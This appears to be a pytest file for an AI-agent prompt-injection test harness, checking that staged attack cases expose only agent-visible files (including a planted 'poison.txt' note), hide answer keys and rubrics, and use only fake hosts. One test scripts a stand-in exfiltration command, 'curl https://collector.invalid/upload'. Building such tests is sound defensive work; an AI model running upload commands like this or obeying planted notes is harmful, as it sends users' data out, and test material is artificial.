"""Attack staging exposes only the fixture's agent-visible files. Run: .venv/bin/python -m pytest sandbox/tests -q"""
import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "scripts" / "phase0"))
sys.path.insert(0, str(ROOT / "scripts" / "hermes"))
import stage_case as sc  # noqa: E402
import stage_attack as sa  # noqa: E402

SECRETS = ("truth.json", "rubric.json", "gold", "attacks_manifest.json", "manifest.json", "SECRET")


def make(tmp_path, extra_in_fixture=()):
    a = tmp_path / "attacks"
    f = a / "A1"
    (f / "docs" / "notes").mkdir(parents=True)
    (f / "task.md").write_text("task")
    (f / "docs" / "eob_835.txt").write_text("eob")
    (f / "docs" / "notes" / "poison.txt").write_text("note")
    for name in ("truth.json", "rubric.json", "attacks_manifest.json", "notes.md", "expected.json"):   # inside the fixture folder, outside docs/
        (f / name).write_text("SECRET")
    (f / "gold").mkdir()
    (f / "gold" / "d.md").write_text("SECRET")
    for name in extra_in_fixture:
        (f / "docs" / name).write_text("SECRET")
    (a / "attacks_manifest.json").write_text(json.dumps({"base_case": "C-0005", "fixtures": {"A1": {}}}))
    d = tmp_path / "data"
    (d / "policy_library").mkdir(parents=True)
    (d / "policy_library" / "MP-1.txt").write_text("policy")
    s = tmp_path / "skills" / "x"
    s.mkdir(parents=True)
    (s / "tool.py").write_text("pass")
    return a, d, tmp_path / "skills"


def listing(stage):
    return sorted(p.relative_to(stage).as_posix() for p in stage.rglob("*") if p.is_file())


def test_only_agent_visible_files_reach_the_staging_dir(tmp_path):
    a, d, s = make(tmp_path)
    stage, base = sa.stage_attack("A1", a, d, tmp_path / "out", s)
    assert base == "C-0005" and stage.name == "C-0005"
    assert listing(stage) == ["case/docs/eob_835.txt", "case/docs/notes/poison.txt", "case/task.md", "policy_library/MP-1.txt", "skills/x/tool.py"]
    for p in listing(stage):
        assert not any(w in p for w in SECRETS)
        assert "SECRET" not in (stage / p).read_text()


@pytest.mark.parametrize("name", ["truth.json", "rubric.json"])
def test_forbidden_file_inside_fixture_docs_fails_closed(tmp_path, name):
    a, d, s = make(tmp_path, extra_in_fixture=(name,))
    with pytest.raises(sc.StagingError):
        sa.stage_attack("A1", a, d, tmp_path / "out", s)
    assert not (tmp_path / "out" / "C-0005").exists()


def test_unknown_or_bad_attack_id_refused(tmp_path):
    a, d, s = make(tmp_path)
    for bad in ("A9", "../A1", "C-0005"):
        with pytest.raises(sc.StagingError):
            sa.stage_attack(bad, a, d, tmp_path / "out", s)


def test_real_fixtures_stage_clean():
    for fid in sa.manifest()["fixtures"]:
        import tempfile
        with tempfile.TemporaryDirectory() as t:
            stage, _ = sa.stage_attack(fid, out_root=t)
            files = listing(stage)
            assert "case/docs/notes/2026-07-14_care_coordination.txt" in files
            assert not any(w in f for f in files for w in ("truth", "rubric", "gold", "manifest"))
            sc.verify(stage)


def test_fixtures_hold_no_answer_key_and_only_fake_destinations():
    import re
    for d in (ROOT / "data" / "attacks").iterdir():
        if not d.is_dir():
            continue
        names = {p.name for p in d.rglob("*")}
        assert not names & {"truth.json", "rubric.json", "gold", "meta.json"}, d
        hosts = set()
        for p in d.rglob("*.txt"):
            hosts |= set(re.findall(r"https?://([A-Za-z0-9.-]+)", p.read_text()))
        assert all(h.endswith(".invalid") for h in hosts - {"example.org"}) or not hosts, (d, hosts)


def test_scripted_step_is_labeled_and_inserted_before_run_end():
    import build_events as be
    base = {"run_id": "r", "case_id": "C-0005", "variant": "hermes", "duration_ms": 0, "status": "ok", "data": {}}
    events = [{**base, "seq": 1, "ts": "t", "kind": "run_start", "name": "run_start"}, {**base, "seq": 2, "ts": "t", "kind": "run_end", "name": "run_end"}]
    sc = {"command": "curl https://collector.invalid/upload", "rc": 56, "stdout": "", "stderr": "CONNECT tunnel failed, response 403", "ts_start": 1.0, "ts_end": 2.0}
    out = be.add_scripted_step(events, sc, {"run_id": "r", "case_id": "C-0005"})
    assert [e["kind"] for e in out] == ["run_start", "tool_call", "tool_result", "run_end"]
    assert [e["seq"] for e in out] == [1, 2, 3, 4]
    assert out[1]["data"]["scripted"] is True and out[1]["data"]["attack_mode"] == "scripted"
    assert out[2]["status"] == "error" and "403" in out[2]["data"]["result"]
